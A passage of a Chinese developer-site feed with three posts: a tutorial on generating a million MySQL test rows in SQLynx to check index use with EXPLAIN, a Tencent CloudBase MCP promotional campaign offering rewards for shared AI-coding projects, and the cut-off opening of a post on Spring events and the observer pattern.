  KEY `idx_user_time` (`user_id`,`create_time`)
) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4;
</code></pre>
<p>我们的目标是：<strong>往这张表里快速灌入 100 万条数据，且数据分布要尽量符合真实业务场景（有离散度），以验证 idx_user_time 索引的有效性。</strong></p>
<h2 data-id="heading-1">02 测试数据配置</h2>
<p>在 SQLynx 中选中表 t_orders，右键选择 <strong>“生成测试数据”</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eededf4cd61d4e8b801f2cee517f56a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765848062&amp;x-signature=ZdNlvHgI4K1u0nu8G4aBpvs91To%3D" alt="" loading="lazy"/></p>
<p>这里不需要写代码，为了让测试结果真实，需要在弹窗中针对字段类型做如下配置：</p>
<ul>
<li>
<p><strong>user_id（模拟高离散度）：</strong></p>
</li>
<li>
<p>设置生成模式为“随机整数”。</p>
</li>
<li>
<p>范围设为 1000 - 50000。</p>
</li>
<li>
<p>技术解读： 模拟 5 万个不同用户的下单行为，测试索引的选择性。</p>
</li>
<li>
<p><strong>amount（模拟金额）：</strong></p>
</li>
<li>
<p>设置生成模式为“随机浮点数”。</p>
</li>
<li>
<p>范围 10.00 - 5000.00。</p>
</li>
<li>
<p><strong>status（模拟低离散度）：</strong></p>
</li>
<li>
<p>设置生成模式为“随机整数”。</p>
</li>
<li>
<p>范围 0 - 3。</p>
</li>
<li>
<p>技术解读： 状态字段通常基数很小，用于测试索引失效的边界情况。</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b87345c744094e82af23c236dfb64de5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765848062&amp;x-signature=CF73L1ZGEnHMEtD2n4eUe4rzG08%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">03 事务与批量大小</h2>
<p>这是从“慢速插入”到“极速写入”的关键一步。</p>
<p>如果在循环中每插入一条数据就 Commit 一次，100 万次网络 IO 和 100 万次 Binlog/Redo Log 刷盘会让写入速度极慢。</p>
<p>在配置界面，我们需要调整<strong>写入策略</strong>：</p>
<ol>
<li><strong>执行模式：</strong> 选择 <strong>“事务执行”</strong>。</li>
<li><strong>批量大小：</strong> 可从 <strong>1000</strong>开始逐步递增，测试最适合自己环境的最佳数值（如<strong>2000-5000的区间值）</strong>。</li>
</ol>
<p><strong>为什么要这样设？</strong></p>
<ul>
<li><strong>减少 IO 开销：</strong> 设置 Batch=1000，意味着每 1000 条 INSERT 语句合并为一个网络包发送，且只进行一次磁盘刷盘。</li>
<li><strong>避免长事务：</strong> 避免直接设置数值过大，如100000。过大的 Batch 会导致 Undo Log 膨胀，甚至可能触碰 MySQL 的 max_allowed_packet 限制导致报错。</li>
<li><strong>模式选择：</strong> 选择 <strong>“追加数据”</strong>。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f75c4c7c9844b1bbcf69cd571b73e85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765848062&amp;x-signature=sFezWpi%2FEj4GXcmQGbvdkeXSDkE%3D" alt="" loading="lazy"/></p>
<p>点击“确认”，进入任务中心查看进度。通常在内网环境下，百万级数据的生成在几十秒~分钟级可完成。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ffe22f827d24dce8d0b423eb6d12297~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765848062&amp;x-signature=ExwkMD3Bx%2FrXg7%2B42UF3bfNiYAw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">04 验证效果：从 ALL 到 ref</h2>
<p>数据到位后，我们可以进行测试。</p>
<p><strong>测试 SQL：</strong> 查询某个用户最近的订单。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_orders <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">10086</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span> LIMIT <span class="hljs-number">10</span>;
</code></pre>
<p>场景 A：数据量 100 条（模拟开发环境）</p>
<p>执行 EXPLAIN，你可能会看到 type: ALL（全表扫描）。</p>
<ul>
<li><strong>现象：</strong> 耗时 0.00ms。</li>
<li><strong>隐患：</strong> 开发者误以为性能完美。实际上是因为数据量太小，MySQL 优化器认为全表扫描成本低于读取索引树，因此主动放弃了索引。这掩盖了潜在的性能问题。</li>
</ul>
<p>场景 B：数据量 100 万条（测试数据生成后）</p>
<p>再次执行 EXPLAIN。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/80bf1650184e4f3db88cc28e5348affa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765848062&amp;x-signature=m0E4hKPutSKX3zZvC%2FDxf8C369k%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>type: ref</strong>：全表扫描（ALL）消失了，key 字段显示为 idx_user_time，说明索引被命中。</p>
</li>
<li>
<p><strong>rows: 21</strong>：我们设置的用户 ID 范围是 1000-50000（基数约 4.9 万）。</p>
</li>
<li>
<p>验证： 总行数 100 万 / 用户基数 4.9 万 ≈ 20.4 行。</p>
</li>
<li>
<p>结论： rows: 21 与理论值一致。这证明了生成的随机数据具有均匀分布特性，没有出现数据倾斜。这种高离散度的数据真实还原了生产环境，验证了索引的高选择性。</p>
</li>
</ul>
<h2 data-id="heading-4">05 总结</h2>
<p>“造数”是后端开发和 DBA 的一项基础设施能力。</p>
<p>利用 SQLynx 的“生成测试数据”功能，可替代手写脚本的繁琐过程。</p>
<p>对于技术人员来说，在实际测试环境中，需要面对百万级、千万级数据的压测，采用便捷稳定的工具可有效帮助工作效率提升，是避免线上故障的最低成本路径。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【CloudBase MCP 升级福利】你的AI开发搭子已进化！晒出AI Coding项目领取周边礼品]]></title>    <link>https://juejin.cn/post/7581396828124119074</link>    <guid>https://juejin.cn/post/7581396828124119074</guid>    <pubDate>2025-12-09T02:51:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581396828124119074" data-draft-id="7581437632853786664" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【CloudBase MCP 升级福利】你的AI开发搭子已进化！晒出AI Coding项目领取周边礼品"/> <meta itemprop="keywords" content="前端,后端,小程序·云开发"/> <meta itemprop="datePublished" content="2025-12-09T02:51:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="腾讯云开发CloudBase"/> <meta itemprop="url" content="https://juejin.cn/user/2963939080036493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【CloudBase MCP 升级福利】你的AI开发搭子已进化！晒出AI Coding项目领取周边礼品
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2963939080036493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    腾讯云开发CloudBase
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:51:55.000Z" title="Tue Dec 09 2025 02:51:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ac63b03933a4f4db110d085debde164~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5byA5Y-RQ2xvdWRCYXNl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853515&amp;x-signature=ZdxxPczG9GaMKoJSKSi9HZZhg54%3D" alt="第二版.png" loading="lazy"/></p>
<p>✨ <strong>震撼首发</strong>：实测CloudBase MCP 三大升级点</p>
<p>🎁 <strong>奖励机制</strong>：参与有礼+实物周边</p>
<p>📝 <strong>简单参与</strong>：社交平台图文分享</p>
<h2 data-id="heading-0">一、CloudBase MCP更新介绍</h2>
<p>🔗<strong>公众号链接：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQM5sIbvqqw9iInGq_aNSOg" target="_blank" title="https://mp.weixin.qq.com/s/QM5sIbvqqw9iInGq_aNSOg" ref="nofollow noopener noreferrer">以防你不知道....CloudBase MCP全新升级!</a></p>
<h2 data-id="heading-1">二、活动详情</h2>
<h4 data-id="heading-2"><strong>📅 活动时间：</strong></h4>
<p>即日起至 2025.12.31</p>
<h4 data-id="heading-3"><strong>🎯 参与方式：</strong></h4>
<ol>
<li><strong>形式：</strong> 🎨 图文短贴</li>
<li><strong>内容要求（包含以下内容）：</strong></li>
</ol>
<p>✅前端技术栈</p>
<p>✅项目链接（web）/小程序体验版二维码</p>
<p>✅项目截图</p>
<ol start="3">
<li><strong>发布平台：</strong> 公众号/CSDN/掘金/小红书/<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%3Ffrom_column%3D20065%26from%3D20065" target="_blank" title="https://cloud.tencent.com/developer?from_column=20065&amp;from=20065" ref="nofollow noopener noreferrer">腾讯云开发者社区</a>/微信开放社区/知乎等主流社区，注意事项：</li>
</ol>
<ul>
<li>带 <strong>#AI</strong> <strong>#CloudBase</strong> 话题 + 活动链接</li>
<li>发帖内容需符合上述要求并在社交平台公开可见</li>
</ul>
<ol start="4">
<li><strong>提交审核：</strong></li>
</ol>
<ul>
<li>在<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2598128" target="_blank" title="https://cloud.tencent.com/developer/article/2598128" ref="nofollow noopener noreferrer">活动贴</a>下方评论你的图文贴链接</li>
</ul>
<h4 data-id="heading-4">✔️投稿示例</h4>
<p><strong>标题：</strong> 三分钟，用 AI 和 CloudBase 搞定一个日记平台</p>
<p><strong>项目介绍：</strong></p>
<p>我创建了一个个人日记平台，让用户可以安全地记录和整理个人日记。平台需要提供日记撰写、编辑、分类和搜索功能，确保用户数据在<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fproduct%2Ftencentdb-catalog%3Ffrom_column%3D20065%26from%3D20065" target="_blank" title="https://cloud.tencent.com/product/tencentdb-catalog?from_column=20065&amp;from=20065" ref="nofollow noopener noreferrer">云数据库</a>中安全存储。</p>
<p>前端使用CodeBuddy IDE</p>
<p>⚡技术栈：Vue3 + Tailwind CSS +DaisyUI 组件库</p>
<p>后端深度集成 CloudBase</p>
<p><strong>⚡</strong>资源：身份认证+云数据库+云函数+云存储+<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fproduct%2Fwh%3Ffrom_column%3D20065%26from%3D20065" target="_blank" title="https://cloud.tencent.com/product/wh?from_column=20065&amp;from=20065" ref="nofollow noopener noreferrer">静态网站托管</a></p>
<p><strong>项目链接：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Ftools%2Fblog-entry%3Ftarget%3Dhttps%253A%252F%252Fcloud1-3gfjcny824250a72-1348325138.tcloudbaseapp.com%252F%26objectId%3D2598128%26objectType%3D1%26contentType%3Dundefined" target="_blank" title="https://cloud.tencent.com/developer/tools/blog-entry?target=https%3A%2F%2Fcloud1-3gfjcny824250a72-1348325138.tcloudbaseapp.com%2F&amp;objectId=2598128&amp;objectType=1&amp;contentType=undefined" ref="nofollow noopener noreferrer">cloud-1348325.tcloudbaseapp.com/</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d9556879a874957b986771798e86610~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5byA5Y-RQ2xvdWRCYXNl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853515&amp;x-signature=jqHhx6nEl0jzdH6jaJHLLRr4Ocs%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bacc0f9c65f4862a2a3d73d3dcdb667~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5byA5Y-RQ2xvdWRCYXNl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853515&amp;x-signature=iIcfcqD5NpF3WdHIrsO8BT6yLZg%3D" alt="" loading="lazy"/></p>
<p><strong>活动链接：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2598128" target="_blank" title="https://cloud.tencent.com/developer/article/2598128" ref="nofollow noopener noreferrer">cloud.tencent.com/developer/a…</a></p>
<p><strong>话题：</strong> #AI #CloudBase #CloudBase AI Toolkit #MCP</p>
<h3 data-id="heading-5"><strong>三、 奖励发放</strong></h3>
<h4 data-id="heading-6"><strong>💰奖励类型</strong></h4>
<ul>
<li>
<p><strong>💴基础奖励，参与有礼</strong></p>
<ul>
<li>10元无门槛代金券</li>
</ul>
</li>
<li>
<p><strong>🏆人气排行榜，前排领取实物周边</strong></p>
<ul>
<li>点赞前三名：Tencent Store 蓝色双肩包 / 漫步者音箱</li>
<li>点赞前十名：CloudBase周边T恤 / 王者荣耀联名耳机</li>
</ul>
</li>
</ul>
<h4 data-id="heading-7"><strong>📦领取方式</strong></h4>
<p>⏳ <strong>基础奖励：</strong> 评论后 3-5个工作日 完成审核，审核通过后发放基础奖励。</p>
<p>🎁 <strong>人气排行：</strong></p>
<ul>
<li>2025.12.31在本贴公布获奖名单</li>
<li>添加云开发小助手微信，留言 <strong>“领取CloudBase活动奖励”+周边寄送地址</strong></li>
</ul>
<p>（点击链接添加微信：<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Ftools%2Fblog-entry%3Ftarget%3Dhttps%253A%252F%252Fwork.weixin.qq.com%252Fca%252Fcawcde5408715d2d8a%26objectId%3D2594472%26objectType%3D1%26contentType%3Dundefined%26from_column%3D20421%26from%3D20421" target="_blank" title="https://cloud.tencent.com/developer/tools/blog-entry?target=https%3A%2F%2Fwork.weixin.qq.com%2Fca%2Fcawcde5408715d2d8a&amp;objectId=2594472&amp;objectType=1&amp;contentType=undefined&amp;from_column=20421&amp;from=20421" ref="nofollow noopener noreferrer">work.weixin.qq.com/ca/cawcde54…</a>）</p>
<h3 data-id="heading-8"><strong>四、注意事项</strong></h3>
<p>❗ 投稿作品不可与往期活动或本期活动重复</p>
<p>⏳ 代金券自领取之日起30天内有效（过期作废）</p>
<p>❓ 如有疑问，请联系客服或提交issue <a href="https://link.juejin.cn?target=https%3A%2F%2Fcnb.cool%2Fgoto%3Furl%3Dhttps%253A%252F%252Ftcb.cloud.tencent.com%252Fhelp-center%26from_column%3D20421%26from%3D20421" target="_blank" title="https://cnb.cool/goto?url=https%3A%2F%2Ftcb.cloud.tencent.com%2Fhelp-center&amp;from_column=20421&amp;from=20421" ref="nofollow noopener noreferrer">tcb.cloud.tencent.com/help-center</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring 的本地消息]]></title>    <link>https://juejin.cn/post/7581619505584046131</link>    <guid>https://juejin.cn/post/7581619505584046131</guid>    <pubDate>2025-12-09T02:51:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581619505584046131" data-draft-id="7581470169839714342" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring 的本地消息"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-09T02:51:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wh_cxy"/> <meta itemprop="url" content="https://juejin.cn/user/616169381574343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring 的本地消息
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/616169381574343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wh_cxy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:51:10.000Z" title="Tue Dec 09 2025 02:51:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>观察者模式、事件通知机制和 Spring 的本地消息机制三者之间存在明确的实现关系，具体来说：</p>
<h2 data-id="heading-0">1. <strong>观察者模式与事件通知机制的关系</strong></h2>
<ul>
<li><strong>观察者模式是事件通知机制的具体实现方式之一</strong></li>
<li>事件驱动编程是一种架构范式，而观察者模式是实现这种范式的具体设计手段</li>
